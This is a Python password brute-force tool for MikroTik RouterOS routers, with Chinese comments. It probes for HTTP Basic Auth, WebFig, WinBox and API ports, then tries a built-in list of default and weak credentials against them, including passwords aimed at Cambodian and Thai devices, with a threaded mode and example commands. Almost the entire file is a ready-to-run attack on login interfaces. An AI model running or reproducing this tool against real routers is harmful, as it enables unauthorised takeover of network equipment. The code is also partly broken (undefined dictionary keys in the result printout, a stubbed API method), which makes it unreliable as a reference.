#!/usr/bin/env python3
"""
RouterOS 终极爆破工具
自动检测并使用最佳攻击方式
"""

import requests
import socket
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

class RouterOSUltimateBrute:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.ip = target.split("//")[-1].split(":")[0].split("/")[0]
        
        # 扩展的凭据库
        self.credentials = [
            ("admin", ""), ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("admin", "Admin"), ("admin", "root"), ("admin", "P@ssw0rd"),
            ("admin", "mikrotik"), ("admin", "router"), ("admin", "secret"),
            ("root", ""), ("root", "admin"), ("root", "password"),
            ("root", "root"), ("root", "toor"), ("root", "1234"),
            ("user", ""), ("user", "user"), ("user", "password"),
            ("administrator", ""), ("administrator", "administrator"),
            # 地区特定密码
            ("admin", "cambodia"), ("admin", "thailand"),
            ("admin", "khmer"), ("admin", "bangkok"), ("admin", "phnompenh"),
        ]
        
        self.success = None
    
    def check_port(self, port):
        """检查端口是否开放"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def detect_target(self):
        """检测目标类型"""
        print(f"\n[*] 检测目标: {self.target}")
        
        methods = []
        
        # 检查HTTP
        try:
            resp = requests.get(self.target, timeout=5, verify=False, allow_redirects=False)
            print(f"[+] HTTP {resp.status_code}")
            
            # 检查是否需要HTTP Basic Auth
            if resp.status_code == 401 and "WWW-Authenticate" in resp.headers:
                auth_header = resp.headers["WWW-Authenticate"]
                if "Basic" in auth_header:
                    print("[+] 检测到: HTTP Basic Authentication")
                    methods.append("basic_auth")
            
            # 检查是否是RouterOS WebFig
            if "routeros" in resp.text.lower() or "webfig" in resp.text.lower():
                print("[+] 检测到: RouterOS WebFig")
                methods.append("webfig")
        except Exception as e:
            print(f"[-] HTTP检测失败: {e}")
        
        # 检查WinBox端口 (8291)
        if self.check_port(8291):
            print("[+] 检测到: WinBox端口 8291 开放")
            methods.append("winbox")
        
        # 检查API端口 (8728)
        if self.check_port(8728):
            print("[+] 检测到: RouterOS API端口 8728 开放")
            methods.append("api")
        
        # 检查API-SSL端口 (8729)
        if self.check_port(8729):
            print("[+] 检测到: RouterOS API-SSL端口 8729 开放")
            methods.append("api_ssl")
        
        return methods
    
    def try_basic_auth(self, username, password):
        """HTTP Basic Auth 爆破"""
        try:
            resp = requests.get(
                self.target,
                auth=(username, password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            # 成功的标志：200状态码且不再要求认证
            if resp.status_code == 200:
                return True
            
            # 某些RouterOS在302重定向时也表示成功
            if resp.status_code == 302 and "login" not in resp.headers.get("Location", "").lower():
                return True
            
        except Exception as e:
            pass
        
        return False
    
    def try_webfig_form(self, username, password):
        """WebFig 表单登录爆破"""
        try:
            session = requests.Session()
            
            # 方法1: 尝试直接POST到login
            login_data = {
                "username": username,
                "password": password,
                "dst": ""
            }
            
            resp = session.post(
                f"{self.target}/login",
                data=login_data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            # 检查是否登录成功
            if resp.status_code == 200:
                # 成功的标志：响应中包含logout或dashboard
                if any(keyword in resp.text.lower() for keyword in ["logout", "dashboard", "interface", "系统"]):
                    return True
            
            # 方法2: 尝试window.name方式
            session2 = requests.Session()
            # 模拟window.name传递凭据
            resp2 = session2.get(
                f"{self.target}/webfig/",
                headers={
                    "Cookie": f"login={username}|{password}"
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            if "error" not in resp2.text.lower() and resp2.status_code == 200:
                return True
                
        except Exception as e:
            pass
        
        return False
    
    def try_api_login(self, username, password, port=8728, use_ssl=False):
        """RouterOS API 登录爆破"""
        try:
            # 这里需要实现RouterOS API协议
            # 暂时返回False
            # TODO: 可以集成 librouteros 或类似库
            pass
        except:
            pass
        return False
    
    def brute_single(self, method, username, password):
        """单次爆破尝试"""
        try:
            if method == "basic_auth":
                return self.try_basic_auth(username, password)
            elif method == "webfig":
                return self.try_webfig_form(username, password)
            elif method == "api":
                return self.try_api_login(username, password, 8728, False)
            elif method == "api_ssl":
                return self.try_api_login(username, password, 8729, True)
        except Exception as e:
            pass
        
        return False
    
    def brute_force(self, methods=None):
        """执行爆破"""
        if not methods:
            methods = self.detect_target()
        
        if not methods:
            print("\n[-] 未检测到可用的攻击方式")
            return None
        
        print(f"\n[+] 开始爆破，使用方法: {methods}")
        print(f"[+] 凭据库大小: {len(self.credentials)}")
        print(f"[+] 目标: {self.target}\n")
        
        for method in methods:
            print(f"\n[*] 尝试方法: {method.upper()}")
            
            for username, password in self.credentials:
                pwd_display = password if password else "(空密码)"
                print(f"  [*] {username}:{pwd_display}", end=" ... ")
                
                if self.brute_single(method, username, password):
                    print("✓ 成功!")
                    self.success = {
                        "method": method,
                        "username": username,
                        "password": password,
                        "target": self.target
                    }
                    return self.success
                else:
                    print("✗")
        
        print("\n[-] 所有方法和凭据都失败了")
        return None
    
    def parallel_brute(self, methods=None, workers=5):
        """并发爆破"""
        if not methods:
            methods = self.detect_target()
        
        if not methods:
            print("\n[-] 未检测到可用的攻击方式")
            return None
        
        print(f"\n[+] 并发爆破，线程数: {workers}")
        print(f"[+] 方法: {methods}")
        print(f"[+] 凭据数: {len(self.credentials)}\n")
        
        tasks = []
        for method in methods:
            for username, password in self.credentials:
                tasks.append((method, username, password))
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            future_to_cred = {
                executor.submit(self.brute_single, m, u, p): (m, u, p)
                for m, u, p in tasks
            }
            
            for future in as_completed(future_to_cred):
                method, username, password = future_to_cred[future]
                try:
                    if future.result():
                        pwd_display = password if password else "(空)"
                        print(f"\n[+++ 成功!] {method.upper()}: {username}:{pwd_display}")
                        
                        # 取消其他任务
                        for f in future_to_cred:
                            f.cancel()
                        
                        return {
                            "method": method,
                            "username": username,
                            "password": password,
                            "target": self.target
                        }
                except Exception as e:
                    pass
        
        print("\n[-] 所有尝试失败")
        return None

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="RouterOS 终极爆破工具 - 自动检测并爆破",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python3 routeros_ultimate_brute.py http://192.168.1.1
  python3 routeros_ultimate_brute.py http://192.168.1.1 --parallel --workers 10
  python3 routeros_ultimate_brute.py http://192.168.1.1 --method basic_auth
        """
    )
    
    parser.add_argument("target", help="目标URL (例如: http://192.168.1.1)")
    parser.add_argument("--method", help="强制使用指定方法 (basic_auth/webfig/api)")
    parser.add_argument("--parallel", action="store_true", help="使用并发模式")
    parser.add_argument("--workers", type=int, default=5, help="并发线程数 (默认:5)")
    parser.add_argument("--timeout", type=int, default=10, help="超时时间 (默认:10)")
    
    args = parser.parse_args()
    
    bruter = RouterOSUltimateBrute(args.target, timeout=args.timeout)
    
    methods = [args.method] if args.method else None
    
    if args.parallel:
        result = bruter.parallel_brute(methods, workers=args.workers)
    else:
        result = bruter.brute_force(methods)
    
    if result:
        print("\n" + "="*60)
        print("成功破解!")
        print("="*60)
        print(f"目标:   {result[target]}")
        print(f"方法:   {result[method].upper()}")
        print(f"用户名: {result[username]}")
        print(f"密码:   {result[password]}")
        print("="*60)
        sys.exit(0)
    else:
        print("\n[-] 爆破失败")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] RouterOS 终极爆破工具")
        print("[+] 使用: python3 routeros_ultimate_brute.py http://target")
        print("[+] 帮助: python3 routeros_ultimate_brute.py --help")

# 添加详细验证模式
def verify_credentials(target, username, password):
    """二次验证凭据（防止误报）"""
    print(f"\n[二次验证] {username}:{password}")
    
    session = requests.Session()
    
    # 验证1: Basic Auth
    resp1 = session.get(target, auth=(username, password), timeout=10, verify=False)
    print(f"  验证1 - Basic Auth: HTTP {resp1.status_code}")
    
    # 验证2: 尝试访问管理页面
    resp2 = session.get(f"{target}/webfig/", timeout=10, verify=False)
    print(f"  验证2 - WebFig: HTTP {resp2.status_code}")
    
    # 验证3: 检查响应内容
    has_logout = "logout" in resp2.text.lower()
    has_dashboard = "dashboard" in resp2.text.lower()
    has_login = "login" in resp2.text.lower() and "password" in resp2.text.lower()
    
    print(f"  验证3 - 响应内容:")
    print(f"    包含logout: {has_logout}")
    print(f"    包含dashboard: {has_dashboard}")  
    print(f"    包含登录表单: {has_login}")
    
    # 综合判断
    if (resp1.status_code == 200 or resp2.status_code == 200) and (has_logout or has_dashboard) and not has_login:
        print("  ✅ 验证通过：确实成功！")
        return True
    else:
        print("  ❌ 验证失败：误报！")
        return False
